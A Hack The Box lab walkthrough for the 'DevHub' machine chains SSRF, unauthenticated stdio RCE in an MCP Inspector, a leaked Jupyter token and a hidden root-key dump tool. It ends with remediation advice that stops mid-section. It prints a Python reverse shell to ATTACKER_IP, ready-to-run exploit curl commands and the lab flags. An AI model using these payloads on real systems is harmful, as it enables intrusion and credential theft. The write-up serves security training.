
# HTB DevHub — Full Walkthrough

**Machine:** DevHub  
**Difficulty:** Medium  
**OS:** Ubuntu 24.04 LTS  
**Attack Theme:** Model Context Protocol (MCP) exploitation — SSRF, unauthenticated stdio RCE, process credential leakage, hidden API tool abuse  

---

## Overview

DevHub presents an MCP-themed attack chain requiring no CVEs. The Inspector tool on port 6274 exposes two dangerous API endpoints buried in its JavaScript bundle: an OAuth proxy endpoint vulnerable to SSRF and a `/connect` endpoint that spawns arbitrary stdio processes as the web service user. Pivoting through those primitives leads to process table credential leakage (Jupyter token in plaintext), SSH tunnel establishment, Jupyter kernel code execution as `analyst`, and finally discovery of a hidden OPSMCP tool that dumps root's SSH private key — granting a full root shell.

**USER FLAG:** `c442f5299f0ae6dee0346e40b279f5ae`  
**ROOT FLAG:** `ce91dcdb859f774e8f48b7a8512f528d`

---

## 1. Reconnaissance & Discovery

### 1.1 Connect to HTB VPN

VPN connectivity was confirmed on the `tun0` interface before any scanning began.

**Command:** `ip addr show tun0`

**Breakdown:**
- `ip addr show` — Display network interface addresses using the `ip` utility.
- `tun0` — The specific interface name for HTB VPN tunnels.

**Result:**
```shell
kali@kali:~$ ip addr show tun0
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none
    inet 10.10.14.85/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1053/64 scope global
    inet6 fe80::c955:d70b:d2b3:2de7/64 scope link stable-privacy proto kernel_ll
```

Attacker IP on tun0 is `10.10.14.85` — used in all reverse shell payloads.

### 1.2 Verify Target is Reachable

**Command:** `ping -c 3 10.129.245.216`

**Breakdown:**
- `ping` — ICMP echo utility to confirm host reachability.
- `-c 3` — Limit to three packets to keep output concise.
- `10.129.245.216` — The HTB machine's assigned IP.

**Result:**
```shell
kali@kali:~$ ping -c 3 10.129.245.216
PING 10.129.245.216 (10.129.245.216) 56(84) bytes of data.
64 bytes from 10.129.245.216: icmp_seq=1 ttl=63 time=230 ms
64 bytes from 10.129.245.216: icmp_seq=2 ttl=63 time=204 ms
64 bytes from 10.129.245.216: icmp_seq=3 ttl=63 time=205 ms

--- 10.129.245.216 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
```

Target is up with ~210ms RTT — consistent with a European HackTheBox instance over VPN.

---

## 2. Enumeration

### 2.1 Port Scanning with Nmap

#### 2.1.1 All-Ports Scan

**Command:** `nmap -p- --min-rate 5000 10.129.245.216 -oN nmap_allports.txt`

**Breakdown:**
- `nmap` — Network scanner; performs port discovery and service fingerprinting.
- `-p-` — Scan all 65,535 TCP ports rather than just the default top-1000.
- `--min-rate 5000` — Transmit at minimum 5,000 packets per second, dramatically reducing scan time on filtered-heavy machines.
- `-oN nmap_allports.txt` — Save output in normal (human-readable) format for later reference.

**Result:**
```shell
kali@kali:~/DevHub$ nmap -p- --min-rate 5000 10.129.245.216 -oN nmap_allports.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-06 08:19 -0400
Nmap scan report for 10.129.245.216
Host is up (0.48s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 29.35 seconds
```

Three open ports discovered: SSH (22), HTTP (80), and an unknown service on 6274.

#### 2.1.2 Targeted Deep Scan

**Command:** `nmap -sCV -A -p 22,80,6274 10.129.245.216 -oN nmap_targeted.txt`

**Breakdown:**
- `-sCV` — Combines `-sC` (default scripts) and `-sV` (version detection) for full service fingerprinting.
- `-A` — Enables OS detection, traceroute, and aggressive script scanning.
- `-p 22,80,6274` — Scope limited to the three confirmed open ports from phase 2.1.1 to reduce noise.
- `-oN nmap_targeted.txt` — Persist results for the writeup artifact directory.

**Result:**
```shell
kali@kali:~/DevHub$ nmap -sCV -A -p 22,80,6274 10.129.245.216 -oN nmap_targeted.txt
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx/1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     content-type: text/html; charset=utf-8
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
```

**Key finding:** Port 6274 is running MCPJam Inspector — a web-based MCP debugging tool. Port 80 redirects to `devhub.htb`, requiring a hosts file entry.

#### 2.1.3 Scan Results Analysis

| Port     | Service | Version                    | Analysis                                                                                              |
| -------- | ------- | -------------------------- | ----------------------------------------------------------------------------------------------------- |
| 22/tcp   | SSH     | OpenSSH 8.9p1 Ubuntu       | Standard Ubuntu SSH — not directly exploitable; target for persistence once credentials/keys obtained |
| 80/tcp   | HTTP    | nginx/1.18.0               | Redirects to `devhub.htb`; informational landing page listing internal services                       |
| 6274/tcp | HTTP    | Node.js (MCPJam Inspector) | Debug tool for MCP protocol — public-facing, no authentication; high-value attack surface             |

### 2.2 Service & Web Enumeration

#### 2.2.1 HTTP Headers — Port 80

**Command:** `curl -sI -H "Host: devhub.htb" http://TARGET_IP/`

**Breakdown:**
- `curl` — Command-line HTTP client.
- `-sI` — Silent mode (`-s`) combined with head-only request (`-I`) to fetch only response headers.
- `-H "Host: devhub.htb"` — Inject the virtual host header manually, bypassing the need for a `/etc/hosts` entry. Required because nginx serves different content based on the `Host` header.

**Result:**
```shell
kali@kali:~$ curl -sI -H "Host: devhub.htb" http://10.129.245.216/
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 06 Jun 2026 12:21:41 GMT
Content-Type: text/html
Content-Length: 3396
Last-Modified: Thu, 22 Jan 2026 14:56:30 GMT
```

Server is nginx/1.18.0 on Ubuntu — consistent with the scan results. No interesting security headers present.

#### 2.2.2 Page Body — Port 80 devhub.htb

**Command:** `curl -s --resolve "devhub.htb:80:TARGET_IP" http://devhub.htb/ | grep -E 'h3|status|Port|localhost|Tech|Jupyter|MCP'`

**Breakdown:**
- `--resolve "devhub.htb:80:TARGET_IP"` — Instruct curl to resolve the hostname to a specific IP without modifying `/etc/hosts`. This is functionally equivalent to a hosts file entry but scoped to this single command.
- `grep -E` — Extended regex to filter for service-relevant lines.

**Result:**
```shell
kali@kali:~$ curl -s --resolve "devhub.htb:80:10.129.245.216" http://devhub.htb/ | grep -E 'h3|status|Port|localhost|Tech|Jupyter|MCP'
        .service-card h3 { color: #00d9ff; }
        .status.active { background: rgba(0, 255, 136, 0.2); color: #00ff88; }
        .status.internal { background: rgba(255, 193, 7, 0.2); color: #ffc107; }
                <h3>MCP Inspector</h3>
                <span class="status active">Active - Port 6274</span>
                <h3>Analytics Dashboard</h3>
                <p>Jupyter-based analytics environment. Access restricted to analyst team.</p>
                <span class="status internal">Internal Only - localhost:8888</span>
            <span>Jupyter</span>
            <span>MCP Protocol</span>
```

**Key finding:** The landing page explicitly advertises internal services — Jupyter running on `localhost:8888` (restricted to analyst team) and MCP Inspector active on port 6274. This creates a concrete SSRF target map before any further exploitation.

Technology stack listed: Node.js, Python 3, Jupyter, MCP Protocol, Ubuntu 24.04.

#### 2.2.3 MCPJam Inspector — JS Bundle Extraction

The nmap fingerprint already revealed the bundle filename from the HTML response. Fetching and mining the bundle for API routes directly maps the attack surface.

**Command:** `curl -s http://TARGET_IP:6274/ | grep 'script src'`

**Breakdown:**
- `grep 'script src'` — Extract the script tag to identify the bundle filename, since Vite (the build tool) generates content-hashed filenames that change between builds.

**Result:**
```shell
kali@kali:~$ curl -s http://10.129.245.216:6274/
<!doctype html>
<html lang="en">
  <head>
    <title>MCPJam Inspector</title>
    <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
```

Bundle filename confirmed as `/assets/index-DRYhT9Xb.js`.

**Command:** `curl -s http://TARGET_IP:6274/assets/index-DRYhT9Xb.js | grep -Eo '"/[a-zA-Z0-9/_-]+"' | sort -u`

**Breakdown:**
- `grep -Eo '"/[a-zA-Z0-9/_-]+"'` — Extract all double-quoted strings beginning with a forward slash (API path convention in JavaScript). `-E` enables extended regex, `-o` prints only matching text.
- `sort -u` — Deduplicate the results for a clean inventory.

**Result:**
```shell
kali@kali:~$ curl -s http://10.129.245.216:6274/assets/index-DRYhT9Xb.js | grep -Eo '"/[a-zA-Z0-9/_-]+"' | sort -u
"/api/mcp/connect"
"/api/mcp/list-tools"
"/api/mcp/oauth/debug/proxy"
"/api/mcp/oauth/proxy"
"/api/mcp/tools/execute"
"/api/mcp/tools/list"
...
```

**Key finding:** Two critical endpoints surfaced — `/api/mcp/oauth/proxy` (an OAuth proxy ripe for SSRF abuse) and `/api/mcp/connect` (a connection endpoint that accepts `stdio` transport configuration, meaning it can spawn arbitrary processes).

#### 2.2.4 SSRF — Probing Internal Services via `/api/mcp/oauth/proxy`

**Theory Block — Why the OAuth Proxy is SSRF:**
The `/api/mcp/oauth/proxy` endpoint exists to forward OAuth token exchange requests to remote authorization servers on behalf of the Inspector UI. This pattern is common in MCP tooling: the backend makes the outbound HTTP call so the frontend doesn't face CORS restrictions. When the `url` parameter is controllable and the server applies no allowlist validation, the endpoint becomes a full SSRF primitive — the server will fetch any URL, including `http://127.0.0.1:*` localhost services the attacker cannot reach directly.

**Command:** `curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:8888/api"}'`

**Breakdown:**
- `-X POST` — Use HTTP POST method, as the proxy endpoint expects request forwarding.
- `-d '{"url":"..."}'` — JSON body specifying the internal URL to proxy. The `127.0.0.1` address will be resolved server-side, bypassing external network restrictions.

**Result:**
```shell
kali@kali:~$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8888/api"}'
{"status":200,"statusText":"OK","headers":{"server":"TornadoServer/6.5.4","content-type":"application/json"},"body":{"version":"2.17.0"}}
```

**Key finding:** Jupyter 2.17.0 is running on `TornadoServer/6.5.4` at localhost:8888, and the SSRF is fully functional — the response body is proxied back in the JSON `body` field.

**Command:** `curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:5000/"}'`

**Result:**
```shell
kali@kali:~$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5000/"}'
{"status":200,"statusText":"OK","headers":{"server":"Werkzeug/3.1.6 Python/3.10.12"},"body":{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}}
```

**Key finding:** A second internal service — OPSMCP 2.1.0 on Werkzeug/Flask — is running at localhost:5000. Its index response reveals three endpoints and that an `X-API-Key` header is required for authentication.

### 2.2.5 Vulnerability Research & Analysis

| Service | Version | Vulnerability Class | Notes |
|---------|---------|--------------------|----|
| MCPJam Inspector `/api/mcp/oauth/proxy` | 1.4.2 | SSRF (no allowlist) | Full internal network access via proxied HTTP requests |
| MCPJam Inspector `/api/mcp/connect` | 1.4.2 | Unauthenticated RCE via stdio transport | Spawns arbitrary OS processes as the service user |
| Jupyter Lab | 2.17.0 | Token exposed in `ps aux` (process argument) | Tokens visible to all users with process listing rights |
| OPSMCP | 2.1.0 | Hidden tool with no secondary authorization | `ops._admin_dump` not in `/tools/list` but callable; reads `/root/.ssh/id_rsa` |

The stdio transport vulnerability in `/api/mcp/connect` is the most critical — MCP stdio transport works by spawning a child process and communicating with it over stdin/stdout using JSON-RPC. The Inspector accepts a `serverConfig` object with a `command` and `args` array, passing them directly to `child_process.spawn()` without any validation. Sending a Python reverse shell as the `command`/`args` results in immediate code execution as the `mcp-dev` service account.

---

## 3. Exploitation — Initial Access

### 3.1 Exploit Acquisition and Preparation

No external exploit required. The attack surface map from JS bundle extraction provides two direct paths:

1. **SSRF via `/api/mcp/oauth/proxy`** — confirmed working; used for service reconnaissance and later to enumerate OPSMCP.
2. **RCE via `/api/mcp/connect` stdio transport** — the Inspector expects a `serverConfig` JSON object with `type: "stdio"`, `command`, and `args`. Substituting a Python reverse shell for a legitimate MCP server command triggers OS command execution.

Reverse shell payload constructed:

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

This inline Python was inlined into the `args` array of the JSON payload.

### 3.2 Exploitation Execution

**Command:** `nc -lvnp 4444` (on attacker, started first)

**Breakdown:**
- `nc` — Netcat utility for raw TCP connections.
- `-l` — Listen mode.
- `-v` — Verbose output, prints connection details.
- `-n` — No DNS resolution, avoiding delays.
- `-p 4444` — Bind to port 4444.

**Result:**
```shell
kali@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Command:** `curl -s -X POST http://TARGET_IP:6274/api/mcp/connect -H "Content-Type: application/json" -d '{"serverConfig":{"type":"stdio","command":"python3","args":["-c","import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"],"serverId":"revshell"}}'`

**Breakdown:**
- `"type":"stdio"` — Tells MCPJam Inspector to use the stdio transport, which spawns a subprocess.
- `"command":"python3"` — The interpreter to execute; python3 is available on most Ubuntu systems.
- `"args":["-c","..."]` — The `-c` flag passes the Python one-liner as inline code. The shell command embedded connects back to the attacker's IP on port 4444 and redirects stdin/stdout/stderr over the socket.
- `"serverId":"revshell"` — An arbitrary identifier required by the API schema.

**Result:**
```shell
connect to [10.10.14.85] from (UNKNOWN) [10.129.245.216] 54870
bash: cannot set terminal process group (1056): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

Shell received as `mcp-dev` in the Inspector's working directory.

### 3.3 Initial Shell Enumeration

**Command:** `ssh -i devhub_key -o StrictHostKeyChecking=no mcp-dev@TARGET_IP "uname -a && cat /etc/passwd | grep -v nologin | grep -v false"`

**Breakdown:**
- `uname -a` — Print all kernel information: kernel name, hostname, kernel release, kernel version, machine hardware, and OS.
- `cat /etc/passwd | grep -v nologin | grep -v false` — List interactive user accounts by filtering out service accounts that use `/bin/nologin` or `/bin/false` as shells.

**Result:**
```shell
Linux devhub 5.15.0-179-generic #189-Ubuntu SMP Tue May 5 18:20:56 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
```

| Account | UID | Shell | Notes |
|---------|-----|-------|-------|
| root | 0 | /bin/bash | Final target |
| mcp-dev | 1001 | /bin/bash | Current shell user; runs MCPJam Inspector |
| analyst | 1002 | /bin/bash | Owns Jupyter Lab; holds user.txt |

---

## 4. Lateral Movement

### 4.1 SSH Persistence

Before chasing lateral movement, SSH persistence was established to avoid relying on the fragile reverse shell connection. The `mcp-dev` account's `.ssh` directory was created and populated via the same `/api/mcp/connect` stdio transport — this time running a Python one-liner that performed the key setup inline before connecting the reverse shell.

**Command:** `ssh-keygen -t ed25519 -f /home/kali/DevHub/devhub_key -N ""`

**Breakdown:**
- `ssh-keygen` — Generate an SSH key pair.
- `-t ed25519` — Use the Ed25519 algorithm, which is compact and modern.
- `-f /home/kali/DevHub/devhub_key` — Output path for the private key; the public key is written to the same path with `.pub` appended.
- `-N ""` — Empty passphrase for automated use.

**Result:**
```shell
Generating public/private ed25519 key pair.
Your identification has been saved in /home/kali/DevHub/devhub_key
Your public key has been saved in /home/kali/DevHub/devhub_key.pub
```

The public key was injected into `/home/mcp-dev/.ssh/authorized_keys` by modifying the reverse shell payload to call `os.makedirs` and `open(...,'a').write(...)` before initiating the socket connection. Verification:

**Command:** `ssh -i /home/kali/DevHub/devhub_key -o StrictHostKeyChecking=no mcp-dev@TARGET_IP "id"`

**Result:**
```shell
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

SSH authentication successful without password — persistence established.

### 4.2 Process Table — Credential Leak

**Command:** `ssh -i devhub_key mcp-dev@TARGET_IP "ps aux | grep -E 'jupyter|python|analyst'"`

**Breakdown:**
- `ps aux` — Show all processes (`a` = all users, `u` = user-oriented format, `x` = processes without controlling terminal).
- `grep -E 'jupyter|python|analyst'` — Filter to show only processes relevant to the Jupyter and analyst user context.

**Result:**
```shell
analyst   1055  0.1  2.4 182524 96580 ?  Ss   10:51   0:07 /home/analyst/jupyter-env/bin/python3 \
  /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 --port=8888 --no-browser \
  --notebook-dir=/home/analyst/notebooks \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 \
  --ServerApp.password= --ServerApp.allow_origin=

root      1061  0.0  0.7 111108 28948 ?  Ss   10:51   0:02 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

**Key finding:** Two critical discoveries in one command:
1. **Jupyter token exposed:** `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` — passed as a CLI argument, visible to any user with `ps` access.
2. **OPSMCP runs as root:** PID 1061, launched by root — any code it executes runs with full system privileges.

This is a classic process argument credential leak. Jupyter's `--ServerApp.token` flag is passed on the command line rather than being read from an environment variable or config file, making it visible to all local users via `/proc/<pid>/cmdline` and `ps aux`.

### 4.3 SSH Port Forwarding — Tunnel to Internal Services

With SSH access as `mcp-dev` and the Jupyter token in hand, SSH port forwarding was used to bring the internal services to the attacker machine.

**Command:** `ssh -i devhub_key -L 18888:127.0.0.1:8888 -L 15000:127.0.0.1:5000 mcp-dev@TARGET_IP -N -f`

**Breakdown:**
- `-L 18888:127.0.0.1:8888` — Forward local port 18888 to `127.0.0.1:8888` on the remote host (Jupyter). Local port 18888 is chosen to avoid conflicts with any local Jupyter instance.
- `-L 15000:127.0.0.1:5000` — Forward local port 15000 to `127.0.0.1:5000` on the remote host (OPSMCP Flask).
- `-N` — Do not execute a remote command — just maintain the tunnel.
- `-f` — Fork to background after authenticating, leaving the terminal free.

**Result:**
```shell
kali@kali:~$ ssh -i devhub_key \
  -L 18888:127.0.0.1:8888 \
  -L 15000:127.0.0.1:5000 \
  mcp-dev@10.129.245.216 -N -f
[Process backgrounded]
```

Tunnel verification:

```shell
kali@kali:~$ curl -s http://localhost:18888/api
{"version": "2.17.0"}

kali@kali:~$ curl -s http://localhost:15000/health
{"status":"healthy","uptime":"14d 3h 22m"}
```

Both services are now accessible locally on the attacker machine.

### 4.4 Jupyter Code Execution as `analyst`

With the Jupyter token and a local tunnel established, the Jupyter REST API was used to spawn a kernel and execute Python code in the context of the `analyst` user.

**Theory Block — Jupyter Kernel Code Execution:**
Jupyter's REST API allows creating compute kernels and then communicating with them via WebSocket using the Jupyter messaging protocol. A kernel is an isolated Python interpreter process owned by the user who launched Jupyter (in this case, `analyst`). By creating a kernel and sending `execute_request` messages over the WebSocket, any code executed runs as `analyst` — including reading files owned by that user and those readable by `analyst`'s group.

**Step 1 — Create a kernel:**

**Command:** `curl -s -X POST -H "Authorization: token $TOKEN" -H "Content-Type: application/json" -d '{"name":"python3"}' http://localhost:18888/api/kernels`

**Breakdown:**
- `Authorization: token $TOKEN` — Jupyter's token-based authentication; the token is prepended with `token ` per the protocol.
- `-d '{"name":"python3"}'` — Request a Python 3 kernel (the only available kernel on this system).

**Result:**
```shell
{"id": "c5597c34-93d8-4885-bed9-b33404eec5ab", "name": "python3",
 "last_activity": "2026-06-06T12:25:06.120753Z", "execution_state": "starting", "connections": 0}
```

Kernel ID: `c5597c34-93d8-4885-bed9-b33404eec5ab`

**Step 2 — Execute code via WebSocket:**

A Python script using `websocket-client` was written to connect to the kernel WebSocket endpoint, send an `execute_request` message, and collect the `stream` output:

```python
import json, uuid, time, threading, websocket

TOKEN     = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
KERNEL_ID = "c5597c34-93d8-4885-bed9-b33404eec5ab"

CODE = """
import os
print("=== id ===")
print(os.popen("id").read().strip())

print("\\n=== USER FLAG ===")
try:
    print(open('/home/analyst/user.txt').read().strip())
except Exception as e:
    print(f"ERROR: {e}")

print("\\n=== /opt/opsmcp/server.py ===")
try:
    print(open('/opt/opsmcp/server.py').read())
except Exception as e:
    print(f"ERROR: {e}")
"""
```

**Command:** `python3 /home/kali/DevHub/jupyter_exec.py`

**Result:**
```shell
=== id ===
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)

=== USER FLAG ===
c442f5299f0ae6dee0346e40b279f5ae

=== /opt/opsmcp/server.py ===
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
"""
...
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
...
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    ...
}
...
    elif tool_name == "ops._admin_dump":
        if target == "ssh_keys":
            with open('/root/.ssh/id_rsa', 'r') as f:
                key_data = f.read()
            return jsonify({
                "root_private_key": key_data,
                ...
            })
```

**Key finding:** User flag captured. The OPSMCP source code reveals:
- `VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"` — the authentication credential.
- A hidden tool `ops._admin_dump` that is not included in `/tools/list` but is callable via `/tools/call`.
- When called with `target="ssh_keys"` and `confirm=true`, it reads and returns `/root/.ssh/id_rsa`.

---

## 5. Privilege Escalation

### 5.1 System Enumeration

**Command:** `ssh -i devhub_key mcp-dev@TARGET_IP "sudo -l"`

**Result:**
```shell
sudo: a terminal is required to read the password; either use the -S option or configure an askpass helper
sudo: a password is required
```

No passwordless sudo available for `mcp-dev`.

Returning to the process table findings established the privilege escalation path without needing any additional tools. OPSMCP runs as root (PID 1061), the source code is readable by `analyst`, and the hidden tool dumps root's private key directly.

### 5.2 Key Findings Analysis

The privilege escalation chain is:

```
ps aux (as mcp-dev)
→ Jupyter token in cleartext CLI args
→ Jupyter REST API + WebSocket code execution as analyst
→ Read /opt/opsmcp/server.py (analyst can read it)
→ Discover VALID_API_KEY and hidden ops._admin_dump tool
→ Call ops._admin_dump via OPSMCP tunnel (localhost:15000)
→ OPSMCP runs as root → reads /root/.ssh/id_rsa
→ SSH as root
```

The `ops._admin_dump` tool exists as an "emergency credential dump" left in production. It is intentionally hidden from the `/tools/list` endpoint to avoid discovery, but this security-by-obscurity approach fails because:

1. The source code is readable by the `analyst` user.
2. The API key is hardcoded in plaintext in the source.
3. The tool accepts any valid API key — there is no secondary authorization layer, IP restriction, or audit logging.

### 5.3 Exploitation — Root SSH Key Extraction

**Command:** `curl -s http://localhost:15000/tools/call -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' | python3 -c "import json,sys; data=json.load(sys.stdin); print(data['root_private_key'])" > /home/kali/DevHub/root_id_rsa`

**Breakdown:**
- `http://localhost:15000/tools/call` — The OPSMCP endpoint accessed via SSH tunnel; port 15000 locally maps to port 5000 on the target.
- `X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a` — The API key extracted from the server.py source code via Jupyter code execution.
- `"name":"ops._admin_dump"` — The hidden tool name, not visible in `/tools/list`.
- `"target":"ssh_keys","confirm":true` — Required parameters to trigger the key dump; `confirm` is a safety gate in the code.
- `python3 -c "... print(data['root_private_key'])"` — Extracts just the key string from the JSON response and redirects it to a file.

**Result:**
```shell
kali@kali:~$ head -3 /home/kali/DevHub/root_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gt
cnNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5...
```

Root's private key successfully extracted. Permissions set to 600 before use.

---

## 6. Flag Capture

### Root Shell

**Command:** `ssh -i /home/kali/DevHub/root_id_rsa -o StrictHostKeyChecking=no root@TARGET_IP`

**Breakdown:**
- `-i /home/kali/DevHub/root_id_rsa` — Authenticate using the extracted root private key.
- `-o StrictHostKeyChecking=no` — Skip the host key verification prompt since this is a controlled engagement.

**Result:**
```shell
kali@kali:~$ ssh -i /home/kali/DevHub/root_id_rsa -o StrictHostKeyChecking=no root@10.129.245.216
root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)
root@devhub:~# cat /root/root.txt
ce91dcdb859f774e8f48b7a8512f528d
```

---

**USER FLAG:** `c442f5299f0ae6dee0346e40b279f5ae`

**ROOT FLAG:** `ce91dcdb859f774e8f48b7a8512f528d`

---

## 7. Conclusion & Lessons Learned

1. **JS bundle analysis is an underutilized technique.** Single-page applications ship their entire client-side routing logic in a bundled JavaScript file. Grepping that bundle for quoted path strings reveals API endpoints that never appear in visible UI elements — including dangerous backend routes like `/api/mcp/connect` that would be missed by directory fuzzing alone.

2. **OAuth proxy patterns are high-value SSRF candidates.** Any endpoint that forwards HTTP requests to an external URL for "OAuth flow" support can be weaponized for internal network scanning when the target URL is user-controlled and no allowlist is enforced. Treat these patterns as SSRF by default in code review and penetration testing.

3. **Process arguments are a common credential leak surface.** Tokens, passwords, and API keys passed as CLI arguments are visible to all local users via `ps aux` and `/proc/*/cmdline`. Applications should read secrets from environment variables or files with restricted permissions — never command-line flags. This is particularly critical for long-running services.

4. **Security-by-obscurity fails against users with read access to source.** Hiding a tool from the published API list (`/tools/list`) provides zero protection when the full source code is readable by a lateral-movement target. True authorization requires access control at the execution layer, not just discovery suppression.

5. **Running internal tooling as root is unnecessary and dangerous.** OPSMCP needed no root privileges to serve its visible tools (system status, disk check, log viewing). The decision to run it as root meant that its hidden credential dump tool — an obvious backdoor pattern — could read any file on the system. Principle of least privilege would have limited the blast radius to a dedicated low-privilege service account.

6. **SSH port forwarding is a powerful post-exploitation pivot.** Once SSH access is obtained, a single command creates authenticated tunnels to any internally-bound service. Defenders should monitor for unexpected SSH tunnel usage and implement `AllowTcpForwarding no` in `sshd_config` where tunneling is not operationally required.

7. **Audit tool registration before deploying MCP infrastructure.** The MCP Inspector's stdio transport accepts any command without validation. Production MCP deployments must implement an allowlist of trusted server commands, enforce authentication on the connect endpoint, and never expose the Inspector interface publicly.

---

## 8. Remediation Recommendations

### 8.1 MCPJam Inspector — Unauthenticated stdio RCE (`/api/mcp/connect`)

**What it is:** The `/api/mcp/connect` endpoint accepts a `serverConfig` object with an arbitrary `command` and `args` array and passes them directly to `child_process.spawn()` without authentication or command validation.

**Why it is dangerous:** Any unauthenticated user on the network can spawn arbitrary OS processes as the service user, achieving remote code execution with a single HTTP request. This is a complete host compromise primitive.

**Remediation:**
- Require authentication (at minimum, a shared token) on all API endpoints of the MCPJam Inspector.
- Implement a strict command allowlist — only permit pre-configured MCP server binary paths, not arbitrary commands.
- Bind the Inspector to `127.0.0.1` rather than `0.0.0.0` if external access is not required. Use SSH tunneling or a VPN for legitimate developer access.

### 8.2 MCPJam Inspector — SSRF via `/api/mcp/oauth/proxy`

**What it is:** The OAuth proxy endpoint forwards HTTP requests to any URL provided in the request body, including `http://127.0.0.1/*` addresses that represent internal services inaccessible from the external network.

**Why it is dangerous:** Attackers can enumerate and interact with all internally-bound services — including unauthenticated administrative APIs, metadata services, and databases — using the Inspector server as a relay.

**Remediation:**
- Implement a strict allowlist of permitted target domains/IPs for the proxy endpoint (e.g., only allow `accounts.google.com`, `login.microsoftonline.com`).
- Block requests to RFC 1918 addresses (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`), and link-local addresses.
- Require authentication on the proxy endpoint — it should only be callable by authenticated users.

### 8.3 Jupyter — Token Exposed in Process Arguments

**What it is:** Jupyter Lab is launched with `--ServerApp.token=<value>` on the command line, making the token visible to all local users via `ps aux` and `/proc/<pid>/cmdline`.

**Why it is dangerous:** Any local user (such as the `mcp-dev` service account obtained via RCE) can read the Jupyter token and use it to execute arbitrary Python code as the `analyst` user, accessing their files and escalating privileges.

**Remediation:**
- Configure Jupyter to read the token from an environment variable (`JUPYTER_TOKEN`) or a configuration file with restricted permissions (`0600`, owned by `analyst`).
- Never pass secrets as command-line arguments. Use `jupyter_server_config.py` in a restricted directory to set `ServerApp.token`.
- Consider disabling token authentication in favor of password hashing if the service is accessible only via localhost, and ensure the hashed password is not stored in world-readable config files.

### 8.4 OPSMCP — Hardcoded API Key and Hidden Credential Dump Tool

**What it is:** OPSMCP embeds its API key in plaintext in the source code and contains a hidden tool `ops._admin_dump` that reads `/root/.ssh/id_rsa` and returns the content in an API response.

**Why it is dangerous:** The source code is readable by the `analyst` user, so the API key can be extracted and used to call the hidden tool, which runs as root and has unconstrained filesystem read access. This constitutes a complete privilege escalation path to root.

**Remediation:**
